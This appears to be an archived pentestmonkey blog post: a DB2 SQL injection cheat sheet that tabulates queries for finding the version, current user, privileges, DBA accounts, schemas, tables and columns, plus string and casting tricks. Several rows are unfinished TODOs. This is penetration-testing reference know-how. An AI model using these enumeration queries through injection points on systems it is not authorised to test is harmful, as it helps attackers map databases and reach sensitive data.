# DB2 SQL Injection Cheat Sheet
Author: pentestmonkey

<p>Finding a SQL injection vulnerability in a web application backed by DB2 isn&#8217;t too common in my experience.  When you do find one, though it pays to be prepared&#8230;</p>
<p><span id="more-84"></span></p>
<p>Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on DB2 8.2 under Windows.</p>
<p>This post is part of series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="https://web.archive.org/web/20180511210859/http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="https://web.archive.org/web/20180511210859/http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>select versionnumber, version_timestamp from sysibm.sysversions;</td>
</tr>
<tr>
<td>Comments</td>
<td>select blah from foo; &#8212; comment like this</td>
</tr>
<tr>
<td>Current User</td>
<td>select user from sysibm.sysdummy1;<br/>
select session_user from sysibm.sysdummy1;<br/>
select system_user from sysibm.sysdummy1;</td>
</tr>
<tr>
<td>List Users</td>
<td>N/A (I think DB2 uses OS-level user accounts for authentication.)Database authorities (like roles, I think) can be listed like this:<br/>
select grantee from syscat.dbauth;</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>N/A (I think DB2 uses OS-level user accounts for authentication.)</td>
</tr>
<tr>
<td>List Privileges</td>
<td>select * from syscat.tabauth; &#8212; privs on tables<br/>
select * from syscat.dbauth where grantee = current user;<br/>
select * from syscat.tabauth where grantee = current user;<br/>
select * from SYSIBM.SYSUSERAUTH &#8211; List db2 system privilegies</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = &#8216;Y&#8217; or SYSADMAUTH = &#8216;G&#8217;</td>
</tr>
<tr>
<td>Current Database</td>
<td>select current server from sysibm.sysdummy1;</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT schemaname FROM syscat.schemata;</td>
</tr>
<tr>
<td>List Columns</td>
<td>select name, tbname, coltype from sysibm.syscolumns;</td>
</tr>
<tr>
<td>List Tables</td>
<td>select name from sysibm.systables;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>select tbname from sysibm.syscolumns where name=&#8217;username&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>select name from (SELECT name FROM sysibm.systables order by<br/>
name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only;</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT SUBSTR(&#8216;abc&#8217;,2,1) FROM sysibm.sysdummy1;  &#8212; returns b</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td><a href="https://web.archive.org/web/20180511210859/http://www.tar.hu/sqlbible/sqlbible0084.html">This page</a> seems to indicate that DB2 has no support for bitwise operators!</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>select chr(65) from sysibm.sysdummy1; &#8212; returns &#8216;A&#8217;</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>select ascii(&#8216;A&#8217;) from sysibm.sysdummy1; &#8212; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT cast(&#8217;123&#8242; as integer) FROM sysibm.sysdummy1;<br/>
SELECT cast(1 as char) FROM sysibm.sysdummy1;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;a&#8217; concat &#8216;b&#8217; concat &#8216;c&#8217; FROM sysibm.sysdummy1; &#8212; returns &#8216;abc&#8217;<br/>
select &#8216;a&#8217; || &#8216;b&#8217; from sysibm.sysdummy1; &#8212; returns &#8216;ab&#8217;</td>
</tr>
<tr>
<td>If Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Case Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>TODO</td>
</tr>
<tr>
<td>Time Delay</td>
<td>???See <a href="https://web.archive.org/web/20180511210859/http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>TODO</td>
</tr>
<tr>
<td>Command Execution</td>
<td>TODO</td>
</tr>
<tr>
<td>Local File Access</td>
<td>TODO</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>TODO</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>TODO</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>TODO</td>
</tr>
</tbody>
</table>
<p>This page will probably remain a work-in-progress for some time yet.  I&#8217;ll update it as I learn more.</p>
<h3>Thanks</h3>
<p>Pentestmonkey gratefully acknowledges the contributions of:</p>
<p>r22mvk</p>
<p>Adri√°n for figuring out lots of the TODO items above:<br/>
